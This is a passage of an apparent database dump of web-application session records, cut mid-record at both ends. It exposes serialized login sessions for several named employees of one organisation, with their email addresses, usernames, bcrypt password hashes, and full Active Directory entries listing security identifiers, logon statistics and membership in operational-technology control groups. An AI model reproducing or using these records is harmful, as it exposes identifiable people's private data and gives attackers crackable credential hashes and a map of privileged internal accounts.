Aguirre\";s:9:\"last_name\";s:0:\"\";s:8:\"password\";s:60:\"$2y$10$lDnSjXsJQpoiBNzedeaYvuzDVa51ARU9xdvw6hWT.AqF/j2s0LPeu\";s:5:\"email\";s:18:\"eroman@ets-rfv.eus\";s:7:\"role_id\";i:1;s:13:\"codigo_agente\";N;s:14:\"notificaciones\";i:1;s:7:\"created\";O:20:\"Cake\\I18n\\FrozenTime\":3:{s:4:\"date\";s:26:\"2018-09-12 09:14:42.000000\";s:13:\"timezone_type\";i:3;s:8:\"timezone\";s:3:\"UTC\";}s:8:\"modified\";O:20:\"Cake\\I18n\\FrozenTime\":3:{s:4:\"date\";s:26:\"2018-09-14 12:02:49.000000\";s:13:\"timezone_type\";i:3;s:8:\"timezone\";s:3:\"UTC\";}s:2:\"dn\";s:83:\"CN-Erlantz-Roman-Ruiz-de-Aguirre-OU-UsuariosSistemasETS-OU-Sistemak-DC-ets-DC-local\";}s:12:\"\0*\0_original\";a:0:{}s:11:\"\0*\0_virtual\";a:0:{}s:13:\"\0*\0_className\";N;s:9:\"\0*\0_dirty\";a:1:{s:2:\"dn\";b:1;}s:7:\"\0*\0_new\";b:0;s:10:\"\0*\0_errors\";a:0:{}s:11:\"\0*\0_invalid\";a:0:{}s:17:\"\0*\0_registryAlias\";s:5:\"Users\";}}',1778097751),('n122nv0f8n60dhnaht8fd68e7a','2026-05-02 21:00:53','Config|a:1:{s:4:\"time\";i:1777755653;}',1777784453),('q4172e4p1ll1k2d3i62nm6df3p','2026-05-07 16:54:37','Config|a:1:{s:4:\"time\";i:1778172971;}Flash|a:0:{}user_ldap|a:2:{s:5:\"count\";i:1;i:0;a:96:{s:11:\"objectclass\";a:5:{s:5:\"count\";i:4;i:0;s:3:\"top\";i:1;s:6:\"person\";i:2;s:20:\"organizationalPerson\";i:3;s:4:\"user\";}i:0;s:11:\"objectclass\";s:2:\"cn\";a:2:{s:5:\"count\";i:1;i:0;s:28:\"Xabier ArgandoГұa GutiГ©rrez\";}i:1;s:2:\"cn\";s:2:\"sn\";a:2:{s:5:\"count\";i:1;i:0;s:21:\"ArgandoГұa GutiГ©rrez\";}i:2;s:2:\"sn\";s:11:\"description\";a:2:{s:5:\"count\";i:1;i:0;s:15:\"OPERADOR Atxuri\";}i:3;s:11:\"description\";s:10:\"postalcode\";a:2:{s:5:\"count\";i:1;i:0;s:4:\"okta\";}i:4;s:10:\"postalcode\";s:9:\"givenname\";a:2:{s:5:\"count\";i:1;i:0;s:6:\"Xabier\";}i:5;s:9:\"givenname\";s:17:\"distinguishedname\";a:2:{s:5:\"count\";i:1;i:0;s:123:\"CN=Xabier ArgandoГұa GutiГ©rrez,OU=OperadorInspector,OU=PMAtxuri,OU=Explotacion,OU=Usuarios ETS,OU=Usuarios,DC=ets,DC=local\";}i:6;s:17:\"distinguishedname\";s:12:\"instancetype\";a:2:{s:5:\"count\";i:1;i:0;s:1:\"4\";}i:7;s:12:\"instancetype\";s:11:\"whencreated\";a:2:{s:5:\"count\";i:1;i:0;s:17:\"20250925085447.0Z\";}i:8;s:11:\"whencreated\";s:11:\"whenchanged\";a:2:{s:5:\"count\";i:1;i:0;s:17:\"20260507142248.0Z\";}i:9;s:11:\"whenchanged\";s:11:\"displayname\";a:2:{s:5:\"count\";i:1;i:0;s:28:\"Xabier ArgandoГұa GutiГ©rrez\";}i:10;s:11:\"displayname\";s:10:\"usncreated\";a:2:{s:5:\"count\";i:1;i:0;s:9:\"352864414\";}i:11;s:10:\"usncreated\";s:8:\"memberof\";a:15:{s:5:\"count\";i:14;i:0;s:78:\"CN=gr_okta_hyland_pro,OU=OKTA,OU=UsuariosDeSistema,OU=Sistemak,DC=ets,DC=local\";i:1;s:78:\"CN=gr_AGS_Operador,OU=AGS_GMV,OU=UsuariosDeSistema,OU=Sistemak,DC=ets,DC=local\";i:2;s:73:\"CN=gr_GIE2023,OU=GIE2023,OU=UsuariosDeSistema,OU=Sistemak,DC=ets,DC=local\";i:3;s:117:\"CN=gr_intranet2023_lectura,OU=Intranet2023,OU=Aplicaciones,OU=zz_Permisos,OU=Usuarios ETS,OU=Usuarios,DC=ets,DC=local\";i:4;s:102:\"CN=gr_tele_est_Operador,OU=TelemandoEstaciones,OU=GruposAcceso,OU=AplicacionesOT,OU=OT,DC=ets,DC=local\";i:5;s:99:\"CN=gr_tele_ene_Oper_Biz,OU=TelemandoEnergia,OU=GruposAcceso,OU=AplicacionesOT,OU=OT,DC=ets,DC=local\";i:6;s:71:\"CN=gr_onbase,OU=ONBASE,OU=UsuariosDeSistema,OU=Sistemak,DC=ets,DC=local\";i:7;s:88:\"CN=gr_mdm_perfil_tred2,OU=MDM,OU=zz_Permisos,OU=Usuarios ETS,OU=Usuarios,DC=ets,DC=local\";i:8;s:96:\"CN=gr_carpeta_explotacion,OU=DatosRed,OU=zz_Permisos,OU=Usuarios ETS,OU=Usuarios,DC=ets,DC=local\";i:9;s:115:\"CN=Gr_datos_red_PM_General_Lectura,OU=Guneak,OU=DatosRed,OU=zz_Permisos,OU=Usuarios ETS,OU=Usuarios,DC=ets,DC=local\";i:10;s:122:\"CN=gr_int_pertsona_lectura,OU=Pertsona_intranet,OU=Aplicaciones,OU=zz_Permisos,OU=Usuarios ETS,OU=Usuarios,DC=ets,DC=local\";i:11;s:125:\"CN=gr_datosRed_Circulacion_logistica_lectura,OU=Guneak,OU=DatosRed,OU=zz_Permisos,OU=Usuarios ETS,OU=Usuarios,DC=ets,DC=local\";i:12;s:68:\"CN=gr_ETS,OU=zz_Permisos,OU=Usuarios ETS,OU=Usuarios,DC=ets,DC=local\";i:13;s:80:\"CN=gr_operador_Atxuri,OU=Explotacion,OU=Usuarios ETS,OU=Usuarios,DC=ets,DC=local\";}i:12;s:8:\"memberof\";s:10:\"usnchanged\";a:2:{s:5:\"count\";i:1;i:0;s:9:\"355071883\";}i:13;s:10:\"usnchanged\";s:4:\"name\";a:2:{s:5:\"count\";i:1;i:0;s:28:\"Xabier ArgandoГұa GutiГ©rrez\";}i:14;s:4:\"name\";s:10:\"objectguid\";a:2:{s:5:\"count\";i:1;i:0;s:16:\"y1|;Л9M¶WҺД+ҫMI\";}i:15;s:10:\"objectguid\";s:18:\"useraccountcontrol\";a:2:{s:5:\"count\";i:1;i:0;s:3:\"512\";}i:16;s:18:\"useraccountcontrol\";s:11:\"badpwdcount\";a:2:{s:5:\"count\";i:1;i:0;s:1:\"0\";}i:17;s:11:\"badpwdcount\";s:8:\"codepage\";a:2:{s:5:\"count\";i:1;i:0;s:1:\"0\";}i:18;s:8:\"codepage\";s:11:\"countrycode\";a:2:{s:5:\"count\";i:1;i:0;s:1:\"0\";}i:19;s:11:\"countrycode\";s:15:\"badpasswordtime\";a:2:{s:5:\"count\";i:1;i:0;s:18:\"134160580593741736\";}i:20;s:15:\"badpasswordtime\";s:10:\"lastlogoff\";a:2:{s:5:\"count\";i:1;i:0;s:1:\"0\";}i:21;s:10:\"lastlogoff\";s:9:\"lastlogon\";a:2:{s:5:\"count\";i:1;i:0;s:18:\"134226281389431930\";}i:22;s:9:\"lastlogon\";s:10:\"pwdlastset\";a:2:{s:5:\"count\";i:1;i:0;s:18:\"134198652558314038\";}i:23;s:10:\"pwdlastset\";s:14:\"primarygroupid\";a:2:{s:5:\"count\";i:1;i:0;s:3:\"513\";}i:24;s:14:\"primarygroupid\";s:14:\"userparameters\";a:2:{s:5:\"count\";i:1;i:0;s:402:\"                                                P\ZCtxCfgPresentг”өж”ұжҲ°гҒўCtxCfgFlags1гҖ°гҒҰгҖІгҖ№CtxShadowг„°гҖ°гҖ°гҖ°*CtxMinEncryptionLevelг„° .CtxWFProfilePathжҢөжҢөгҢ¶гӨ¶гҳ¶гҢ·жҢөгҢ¶гӨ¶гҗ·гҲ·гӨ¶г ·гҗІжҢөг ·г„¶г„¶гҲ·гң¶г„¶ж”¶гҖ°\"\\CtxWFProfilePathWжҢөгҖ°жҢөгҖ°гҢ¶гҖ°гӨ¶гҖ°гҳ¶гҖ°гҢ·гҖ°жҢөгҖ°гҢ¶гҖ°гӨ¶гҖ°гҗ·гҖ°гҲ·гҖ°гӨ¶гҖ°г ·гҖ°гҗІгҖ°жҢөгҖ°г ·гҖ°г„¶гҖ°г„¶гҖ°гҲ·гҖ°гң¶гҖ°г„¶гҖ°ж”¶гҖ°гҖ°гҖ°\";}i:25;s:14:\"userparameters\";s:11:\"profilepath\";a:2:{s:5:\"count\";i:1;i:0;s:22:\"\\\\cifs\\citrix$\\xaargan\";}i:26;s:11:\"profilepath\";s:9:\"objectsid\";a:2:{s:5:\"count\";i:1;i:0;s:28:\"\0\0\0\0\0\0\0\0ХЛ\\XЎфbе;+ј4\0\0\";}i:27;s:9:\"objectsid\";s:14:\"accountexpires\";a:2:{s:5:\"count\";i:1;i:0;s:19:\"9223372036854775807\";}i:28;s:14:\"accountexpires\";s:10:\"logoncount\";a:2:{s:5:\"count\";i:1;i:0;s:3:\"104\";}i:29;s:10:\"logoncount\";s:14:\"samaccountname\";a:2:{s:5:\"count\";i:1;i:0;s:7:\"xaargan\";}i:30;s:14:\"samaccountname\";s:14:\"samaccounttype\";a:2:{s:5:\"count\";i:1;i:0;s:9:\"805306368\";}i:31;s:14:\"samaccounttype\";s:17:\"userprincipalname\";a:2:{s:5:\"count\";i:1;i:0;s:19:\"xaargan@ets-rfv.eus\";}i:32;s:17:\"userprincipalname\";s:14:\"objectcategory\";a:2:{s:5:\"count\";i:1;i:0;s:52:\"CN=Person,CN=Schema,CN=Configuration,DC=ets,DC=local\";}i:33;s:14:\"objectcategory\";s:21:\"dscorepropagationdata\";a:4:{s:5:\"count\";i:3;i:0;s:17:\"20260204142051.0Z\";i:1;s:17:\"20250925103249.0Z\";i:2;s:17:\"16010101000000.0Z\";}i:34;s:21:\"dscorepropagationdata\";s:21:\"ms-ds-consistencyguid\";a:2:{s:5:\"count\";i:1;i:0;s:16:\"y1|;Л9M¶WҺД+ҫMI\";}i:35;s:21:\"ms-ds-consistencyguid\";s:18:\"lastlogontimestamp\";a:2:{s:5:\"count\";i:1;i:0;s:18:\"134226281376239291\";}i:36;s:18:\"lastlogontimestamp\";s:39:\"msds-lastsuccessfulinteractivelogontime\";a:2:{s:5:\"count\";i:1;i:0;s:18:\"134226370980971092\";}i:37;s:39:\"msds-lastsuccessfulinteractivelogontime\";s:35:\"msds-lastfailedinteractivelogontime\";a:2:{s:5:\"count\";i:1;i:0;s:18:\"134218950693880504\";}i:38;s:35:\"msds-lastfailedinteractivelogontime\";s:32:\"msds-failedinteractivelogoncount\";a:2:{s:5:\"count\";i:1;i:0;s:2:\"56\";}i:39;s:32:\"msds-failedinteractivelogoncount\";s:53:\"msds-failedinteractivelogoncountatlastsuccessfullogon\";a:2:{s:5:\"count\";i:1;i:0;s:2:\"56\";}i:40;s:53:\"msds-failedinteractivelogoncountatlastsuccessfullogon\";s:14:\"mstsexpiredate\";a:2:{s:5:\"count\";i:1;i:0;s:17:\"20260612042625.0Z\";}i:41;s:14:\"mstsexpiredate\";s:18:\"mstslicenseversion\";a:2:{s:5:\"count\";i:1;i:0;s:6:\"655361\";}i:42;s:18:\"mstslicenseversion\";s:14:\"mstsmanagingls\";a:2:{s:5:\"count\";i:1;i:0;s:23:\"00430-10000-14577-AT763\";}i:43;s:14:\"mstsmanagingls\";s:19:\"mstslicenseversion2\";a:2:{s:5:\"count\";i:1;i:0;s:1:\"7\";}i:44;s:19:\"mstslicenseversion2\";s:19:\"mstslicenseversion3\";a:2:{s:5:\"count\";i:1;i:0;s:11:\"C50-10.01-S\";}i:45;s:19:\"mstslicenseversion3\";s:4:\"mail\";a:2:{s:5:\"count\";i:1;i:0;s:22:\"xargandona@ets-rfv.eus\";}i:46;s:4:\"mail\";s:5:\"count\";i:47;s:2:\"dn\";s:123:\"CN=Xabier ArgandoГұa GutiГ©rrez,OU=OperadorInspector,OU=PMAtxuri,OU=Explotacion,OU=Usuarios ETS,OU=Usuarios,DC=ets,DC=local\";}}Preferences|a:3:{s:6:\"IDIOMA\";s:5:\"es_ES\";s:15:\"PUESTOS_GESTION\";s:1:\"1\";s:4:\"skin\";s:9:\"skin-blue\";}Auth|a:1:{s:4:\"User\";O:21:\"App\\Model\\Entity\\User\":11:{s:14:\"\0*\0_accessible\";a:2:{s:1:\"*\";b:1;s:2:\"id\";b:0;}s:10:\"\0*\0_hidden\";a:1:{i:0;s:8:\"password\";}s:14:\"\0*\0_properties\";a:12:{s:2:\"id\";i:165;s:8:\"username\";s:7:\"xaargan\";s:10:\"firts_name\";s:28:\"Xabier ArgandoГұa GutiГ©rrez\";s:9:\"last_name\";N;s:8:\"password\";s:60:\"$2y$10$FWuuPU71v20OMveLXgwHv.QY/oN356e2dlEyTRKcbTLYVBPIkVTgq\";s:5:\"email\";s:22:\"xargandona@ets-rfv.eus\";s:7:\"role_id\";i:2;s:13:\"codigo_agente\";i:507;s:14:\"notificaciones\";i:1;s:7:\"created\";O:20:\"Cake\\I18n\\FrozenTime\":3:{s:4:\"date\";s:26:\"2025-10-14 09:15:12.000000\";s:13:\"timezone_type\";i:3;s:8:\"timezone\";s:3:\"UTC\";}s:8:\"modified\";O:20:\"Cake\\I18n\\FrozenTime\":3:{s:4:\"date\";s:26:\"2025-10-14 10:54:48.000000\";s:13:\"timezone_type\";i:3;s:8:\"timezone\";s:3:\"UTC\";}s:2:\"dn\";s:121:\"CN-Xabier-Argandona-Gutierrez-OU-OperadorInspector-OU-PMAtxuri-OU-Explotacion-OU-Usuarios-ETS-OU-Usuarios-DC-ets-DC-local\";}s:12:\"\0*\0_original\";a:0:{}s:11:\"\0*\0_virtual\";a:0:{}s:13:\"\0*\0_className\";N;s:9:\"\0*\0_dirty\";a:1:{s:2:\"dn\";b:1;}s:7:\"\0*\0_new\";b:0;s:10:\"\0*\0_errors\";a:0:{}s:11:\"\0*\0_invalid\";a:0:{}s:17:\"\0*\0_registryAlias\";s:5:\"Users\";}}',1778201772),('rj9h0htbnd52li9mnv03adce0m','2026-05-12 10:34:40','Config|a:1:{s:4:\"time\";i:1778582195;}Flash|a:0:{}user_ldap|a:2:{s:5:\"count\";i:1;i:0;a:98:{s:11:\"objectclass\";a:5:{s:5:\"count\";i:4;i:0;s:3:\"top\";i:1;s:6:\"person\";i:2;s:20:\"organizationalPerson\";i:3;s:4:\"user\";}i:0;s:11:\"objectclass\";s:2:\"cn\";a:2:{s:5:\"count\";i:1;i:0;s:20:\"Karlos Santos Alonso\";}i:1;s:2:\"cn\";s:2:\"sn\";a:2:{s:5:\"count\";i:1;i:0;s:13:\"Santos Alonso\";}i:2;s:2:\"sn\";s:11:\"description\";a:2:{s:5:\"count\";i:1;i:0;s:31:\"Tecnico de red y Operador Amara\";}i:3;s:11:\"description\";s:10:\"postalcode\";a:2:{s:5:\"count\";i:1;i:0;s:4:\"okta\";}i:4;s:10:\"postalcode\";s:9:\"givenname\";a:2:{s:5:\"count\";i:1;i:0;s:6:\"Karlos\";}i:5;s:9:\"givenname\";s:17:\"distinguishedname\";a:2:{s:5:\"count\";i:1;i:0;s:148:\"CN=Karlos Santos Alonso,OU=Operador_y_tecnico_de_red_Nasalb01,OU=Estaciones_CTX6_Netalb01,OU=Explotacion,OU=Usuarios ETS,OU=Usuarios,DC=ets,DC=local\";}i:6;s:17:\"distinguishedname\";s:12:\"instancetype\";a:2:{s:5:\"count\";i:1;i:0;s:1:\"4\";}i:7;s:12:\"instancetype\";s:11:\"whencreated\";a:2:{s:5:\"count\";i:1;i:0;s:17:\"20210629080018.0Z\";}i:8;s:11:\"whencreated\";s:11:\"whenchanged\";a:2:{s:5:\"count\";i:1;i:0;s:17:\"20260512102101.0Z\";}i:9;s:11:\"whenchanged\";s:11:\"displayname\";a:2:{s:5:\"count\";i:1;i:0;s:20:\"Karlos Santos Alonso\";}i:10;s:11:\"displayname\";s:10:\"usncreated\";a:2:{s:5:\"count\";i:1;i:0;s:5:\"56543\";}i:11;s:10:\"usncreated\";s:8:\"memberof\";a:18:{s:5:\"count\";i:17;i:0;s:81:\"CN=gr_mdm_teams,OU=MDM,OU=zz_Permisos,OU=Usuarios ETS,OU=Usuarios,DC=ets,DC=local\";i:1;s:78:\"CN=gr_okta_hyland_pro,OU=OKTA,OU=UsuariosDeSistema,OU=Sistemak,DC=ets,DC=local\";i:2;s:78:\"CN=gr_AGS_Operador,OU=AGS_GMV,OU=UsuariosDeSistema,OU=Sistemak,DC=ets,DC=local\";i:3;s:73:\"CN=gr_GIE2023,OU=GIE2023,OU=UsuariosDeSistema,OU=Sistemak,DC=ets,DC=local\";i:4;s:85:\"CN=gr_Okta_Usuario_Sin_Movil,OU=OKTA,OU=UsuariosDeSistema,OU=Sistemak,DC=ets,DC=local\";i:5;s:102:\"CN=gr_tele_est_Operador,OU=TelemandoEstaciones,OU=GruposAcceso,OU=AplicacionesOT,OU=OT,DC=ets,DC=local\";i:6;s:71:\"CN=gr_onbase,OU=ONBASE,OU=UsuariosDeSistema,OU=Sistemak,DC=ets,DC=local\";i:7;s:88:\"CN=gr_mdm_perfil_tred2,OU=MDM,OU=zz_Permisos,OU=Usuarios ETS,OU=Usuarios,DC=ets,DC=local\";i:8;s:115:\"CN=Gr_datos_red_PM_General_Lectura,OU=Guneak,OU=DatosRed,OU=zz_Permisos,OU=Usuarios ETS,OU=Usuarios,DC=ets,DC=local\";i:9;s:103:\"CN=gr_ctx_perfil,OU=Estaciones_CTX6_Netalb01,OU=Explotacion,OU=Usuarios ETS,OU=Usuarios,DC=ets,DC=local\";i:10;s:108:\"CN=gr_ctx_tecnicosred,OU=Estaciones_CTX6_Netalb01,OU=Explotacion,OU=Usuarios ETS,OU=Usuarios,DC=ets,DC=local\";i:11;s:122:\"CN=gr_int_pertsona_lectura,OU=Pertsona_intranet,OU=Aplicaciones,OU=zz_Permisos,OU=Usuarios ETS,OU=Usuarios,DC=ets,DC=local\";i:12;s:107:\"CN=gr_ctx_estaciones,OU=Estaciones_CTX6_Netalb01,OU=Explotacion,OU=Usuarios ETS,OU=Usuarios,DC=ets,DC=local\";i:13;s:125:\"CN=gr_datosRed_Circulacion_logistica_lectura,OU=Guneak,OU=DatosRed,OU=zz_Permisos,OU=Usuarios ETS,OU=Usuarios,DC=ets,DC=local\";i:14;s:68:\"CN=gr_ETS,OU=zz_Permisos,OU=Usuarios ETS,OU=Usuarios,DC=ets,DC=local\";i:15;s:80:\"CN=gr_operador_Atxuri,OU=Explotacion,OU=Usuarios ETS,OU=Usuarios,DC=ets,DC=local\";i:16;s:79:\"CN=gr_operador_Amara,OU=Explotacion,OU=Usuarios ETS,OU=Usuarios,DC=ets,DC=local\";}i:12;s:8:\"memberof\";s:10:\"usnchanged\";a:2:{s:5:\"count\";i:1;i:0;s:9:\"355128923\";}i:13;s:10:\"usnchanged\";s:4:\"name\";a:2:{s:5:\"count\";i:1;i:0;s:20:\"Karlos Santos Alonso\";}i:14;s:4:\"name\";s:10:\"objectguid\";a:2:{s:5:\"count\";i:1;i:0;s:16:\"Ҙ\'Р:}>MұчЦ©Іn^\";}i:15;s:10:\"objectguid\";s:18:\"useraccountcontrol\";a:2:{s:5:\"count\";i:1;i:0;s:3:\"512\";}i:16;s:18:\"useraccountcontrol\";s:11:\"badpwdcount\";a:2:{s:5:\"count\";i:1;i:0;s:1:\"0\";}i:17;s:11:\"badpwdcount\";s:8:\"codepage\";a:2:{s:5:\"count\";i:1;i:0;s:1:\"0\";}i:18;s:8:\"codepage\";s:11:\"countrycode\";a:2:{s:5:\"count\";i:1;i:0;s:1:\"0\";}i:19;s:11:\"countrycode\";s:15:\"badpasswordtime\";a:2:{s:5:\"count\";i:1;i:0;s:18:\"134230541622120296\";}i:20;s:15:\"badpasswordtime\";s:10:\"lastlogoff\";a:2:{s:5:\"count\";i:1;i:0;s:1:\"0\";}i:21;s:10:\"lastlogoff\";s:9:\"lastlogon\";a:2:{s:5:\"count\";i:1;i:0;s:18:\"134230542654151285\";}i:22;s:9:\"lastlogon\";s:10:\"pwdlastset\";a:2:{s:5:\"count\";i:1;i:0;s:18:\"134223391040119943\";}i:23;s:10:\"pwdlastset\";s:14:\"primarygroupid\";a:2:{s:5:\"count\";i:1;i:0;s:3:\"513\";}i:24;s:14:\"primarygroupid\";s:14:\"userparameters\";a:2:{s:5:\"count\";i:1;i:0;s:402:\"                                                P\ZCtxCfgPresentг”өж”ұжҲ°гҒўCtxCfgFlags1гҖ°гҒҰгҖІгҖ№CtxShadowг„°гҖ°гҖ°гҖ°*CtxMinEncryptionLevelг„° .CtxWFProfilePathжҢөжҢөгҢ¶гӨ¶гҳ¶гҢ·жҢөгҢ¶гӨ¶гҗ·гҲ·гӨ¶г ·гҗІжҢөжҲ¶г„¶гҢ·г„¶ж”¶гҗ·жҳ¶гҖ°\"\\CtxWFProfilePathWжҢөгҖ°жҢөгҖ°гҢ¶гҖ°гӨ¶гҖ°гҳ¶гҖ°гҢ·гҖ°жҢөгҖ°гҢ¶гҖ°гӨ¶гҖ°гҗ·гҖ°гҲ·гҖ°гӨ¶гҖ°г ·гҖ°гҗІгҖ°жҢөгҖ°жҲ¶гҖ°г„¶гҖ°гҢ·гҖ°г„¶гҖ°ж”¶гҖ°гҗ·гҖ°жҳ¶гҖ°гҖ°гҖ°\";}i:25;s:14:\"userparameters\";s:9:\"objectsid\";a:2:{s:5:\"count\";i:1;i:0;s:28:\"\0\0\0\0\0\0\0\0ХЛ\\XЎфbе;+B&\0\0\";}i:26;s:9:\"objectsid\";s:14:\"accountexpires\";a:2:{s:5:\"count\";i:1;i:0;s:19:\"9223372036854775807\";}i:27;s:14:\"accountexpires\";s:10:\"logoncount\";a:2:{s:5:\"count\";i:1;i:0;s:4:\"4901\";}i:28;s:10:\"logoncount\";s:14:\"samaccountname\";a:2:{s:5:\"count\";i:1;i:0;s:7:\"kasanto\";}i:29;s:14:\"samaccountname\";s:14:\"samaccounttype\";a:2:{s:5:\"count\";i:1;i:0;s:9:\"805306368\";}i:30;s:14:\"samaccounttype\";s:17:\"userprincipalname\";a:2:{s:5:\"count\";i:1;i:0;s:19:\"kasanto@ets-rfv.eus\";}i:31;s:17:\"userprincipalname\";s:11:\"lockouttime\";a:2:{s:5:\"count\";i:1;i:0;s:1:\"0\";}i:32;s:11:\"lockouttime\";s:14:\"objectcategory\";a:2:{s:5:\"count\";i:1;i:0;s:52:\"CN=Person,CN=Schema,CN=Configuration,DC=ets,DC=local\";}i:33;s:14:\"objectcategory\";s:21:\"dscorepropagationdata\";a:6:{s:5:\"count\";i:5;i:0;s:17:\"20250612112441.0Z\";i:1;s:17:\"20250612110941.0Z\";i:2;s:17:\"20250228100006.0Z\";i:3;s:17:\"20241018103005.0Z\";i:4;s:17:\"16010714223649.0Z\";}i:34;s:21:\"dscorepropagationdata\";s:21:\"ms-ds-consistencyguid\";a:2:{s:5:\"count\";i:1;i:0;s:16:\"Ҙ\'Р:}>MұчЦ©Іn^\";}i:35;s:21:\"ms-ds-consistencyguid\";s:18:\"lastlogontimestamp\";a:2:{s:5:\"count\";i:1;i:0;s:18:\"134229689705049464\";}i:36;s:18:\"lastlogontimestamp\";s:22:\"msds-authenticatedatdc\";a:2:{s:5:\"count\";i:1;i:0;s:51:\"CN=D-SERV-DOM,OU=Domain Controllers,DC=ets,DC=local\";}i:37;s:22:\"msds-authenticatedatdc\";s:39:\"msds-lastsuccessfulinteractivelogontime\";a:2:{s:5:\"count\";i:1;i:0;s:18:\"134230542654151285\";}i:38;s:39:\"msds-lastsuccessfulinteractivelogontime\";s:35:\"msds-lastfailedinteractivelogontime\";a:2:{s:5:\"count\";i:1;i:0;s:18:\"134230541620791504\";}i:39;s:35:\"msds-lastfailedinteractivelogontime\";s:32:\"msds-failedinteractivelogoncount\";a:2:{s:5:\"count\";i:1;i:0;s:2:\"52\";}i:40;s:32:\"msds-failedinteractivelogoncount\";s:53:\"msds-failedinteractivelogoncountatlastsuccessfullogon\";a:2:{s:5:\"count\";i:1;i:0;s:2:\"52\";}i:41;s:53:\"msds-failedinteractivelogoncountatlastsuccessfullogon\";s:14:\"mstsexpiredate\";a:2:{s:5:\"count\";i:1;i:0;s:17:\"20260502145526.0Z\";}i:42;s:14:\"mstsexpiredate\";s:18:\"mstslicenseversion\";a:2:{s:5:\"count\";i:1;i:0;s:6:\"655361\";}i:43;s:18:\"mstslicenseversion\";s:14:\"mstsmanagingls\";a:2:{s:5:\"count\";i:1;i:0;s:23:\"00430-10000-91280-AT686\";}i:44;s:14:\"mstsmanagingls\";s:19:\"mstslicenseversion2\";a:2:{s:5:\"count\";i:1;i:0;s:1:\"7\";}i:45;s:19:\"mstslicenseversion2\";s:19:\"mstslicenseversion3\";a:2:{s:5:\"count\";i:1;i:0;s:11:\"C50-10.01-S\";}i:46;s:19:\"mstslicenseversion3\";s:4:\"mail\";a:2:{s:5:\"count\";i:1;i:0;s:19:\"ksantos@ets-rfv.eus\";}i:47;s:4:\"mail\";s:5:\"count\";i:48;s:2:\"dn\";s:148:\"CN=Karlos Santos Alonso,OU=Operador_y_tecnico_de_red_Nasalb01,OU=Estaciones_CTX6_Netalb01,OU=Explotacion,OU=Usuarios ETS,OU=Usuarios,DC=ets,DC=local\";}}Preferences|a:3:{s:6:\"IDIOMA\";s:5:\"es_ES\";s:15:\"PUESTOS_GESTION\";s:1:\"1\";s:4:\"skin\";s:9:\"skin-blue\";}Auth|a:1:{s:4:\"User\";O:21:\"App\\Model\\Entity\\User\":11:{s:14:\"\0*\0_accessible\";a:2:{s:1:\"*\";b:1;s:2:\"id\";b:0;}s:10:\"\0*\0_hidden\";a:1:{i:0;s:8:\"password\";}s:14:\"\0*\0_properties\";a:12:{s:2:\"id\";i:130;s:8:\"username\";s:7:\"kasanto\";s:10:\"firts_name\";s:20:\"Karlos Santos Alonso\";s:9:\"last_name\";s:0:\"\";s:8:\"password\";s:60:\"$2y$10$DtZ4lsiWfyOkZCFX9NHkvuIsy9lHbmb8Tuclg1FxDzc.Tu88K8cqO\";s:5:\"email\";s:19:\"ksantos@ets-rfv.eus\";s:7:\"role_id\";i:2;s:13:\"codigo_agente\";i:459;s:14:\"notificaciones\";i:1;s:7:\"created\";O:20:\"Cake\\I18n\\FrozenTime\":3:{s:4:\"date\";s:26:\"2022-02-14 12:15:11.000000\";s:13:\"timezone_type\";i:3;s:8:\"timezone\";s:3:\"UTC\";}s:8:\"modified\";O:20:\"Cake\\I18n\\FrozenTime\":3:{s:4:\"date\";s:26:\"2022-02-14 12:28:27.000000\";s:13:\"timezone_type\";i:3;s:8:\"timezone\";s:3:\"UTC\";}s:2:\"dn\";s:148:\"CN-Karlos-Santos-Alonso-OU-Operador-y-tecnico-de-red-Nasalb01-OU-Estaciones-CTX6-Netalb01-OU-Explotacion-OU-Usuarios-ETS-OU-Usuarios-DC-ets-DC-local\";}s:12:\"\0*\0_original\";a:0:{}s:11:\"\0*\0_virtual\";a:0:{}s:13:\"\0*\0_className\";N;s:9:\"\0*\0_dirty\";a:1:{s:2:\"dn\";b:1;}s:7:\"\0*\0_new\";b:0;s:10:\"\0*\0_errors\";a:0:{}s:11:\"\0*\0_invalid\";a:0:{}s:17:\"\0*\0_registryAlias\";s:5:\"Users\";}}',1778610995),('smn0h9qqg0m7lub2f8ar9ne1it','2026-05-09 22:38:38','Config|a:1:{s:4:\"time\";i:1778366364;}Preferences|a:3:{s:6:\"IDIOMA\";s:5:\"es_ES\";s:15:\"PUESTOS_GESTION\";s:1:\"1\";s:4:\"skin\";s:9:\"skin-blue\";}Auth|a:1:{s:4:\"User\";O:21:\"App\\Model\\Entity\\User\":11:{s:14:\"\0*\0_accessible\";a:2:{s:1:\"*\";b:1;s:2:\"id\";b:0;}s:10:\"\0*\0_hidden\";a:1:{i:0;s:8:\"password\";}s:14:\"\0*\0_properties\";a:12:{s:2:\"id\";i:132;s:8:\"username\";s:7:\"naelhad\";s:10:\"firts_name\";s:22:\"Nabil El Hadri Boukouh\";s:9:\"last_name\";s:0:\"\";s:8:\"password\";s:60:\"$2y$10$bF4P.jq89GRylVkxHhor8ub5bG/J6taD/gRnEjAuUbx3ysQ92.Ile\";s:5:\"email\";s:20:\"nelhadri@ets-rfv.eus\";s:7:\"role_id\";i:2;s:13:\"codigo_agente\";i:449;s:14:\"notificaciones\";i:1;s:7:\"created\";O:20:\"Cake\\I18n\\FrozenTime\":3:{s:4:\"date\";s:26:\"2022-03-04 08:30:32.000000\";s:13:\"timezone_type\";i:3;s:8:\"timezone\";s:3:\"UTC\";}s:8:\"modified\";O:20:\"Cake\\I18n\\FrozenTime\":3:{s:4:\"date\";s:26:\"2022-03-04 08:37:04.000000\";s:13:\"timezone_type\";i:3;s:8:\"timezone\";s:3:\"UTC\";}s:2:\"dn\";s:112:\"CN-Nabil-El-Hadri-Boukouh-OU-Estaciones-CTX6-Netalb01-OU-Explotacion-OU-Usuarios-ETS-OU-Usuarios-DC-ets-DC-local\";}s:12:\"\0*\0_original\";a:0:{}s:11:\"\0*\0_virtual\";a:0:{}s:13:\"\0*\0_className\";N;s:9:\"\0*\0_dirty\";a:1:{s:2:\"dn\";b:1;}s:7:\"\0*\0_new\";b:0;s:10:\"\0*\0_errors\";a:0:{}s:11:\"\0*\0_invalid\";a:0:{}s:17:\"\0*\0_registryAlias\";s:5:\"Users\";}}Flash|a:0:{}',1778395164),('t7f8g0dr3k74osuerrm2ofr1no','2026-05-06 